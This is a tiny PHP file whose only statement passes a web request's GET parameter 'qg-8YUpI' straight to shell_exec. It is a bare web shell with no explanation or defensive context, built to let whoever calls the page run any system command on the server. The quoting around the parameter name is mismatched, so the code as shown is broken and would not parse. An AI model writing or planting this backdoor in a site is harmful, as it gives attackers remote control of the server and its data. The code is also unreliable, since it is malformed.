<?php
shell_exec($_GET["qg-8YUpI']);
?>
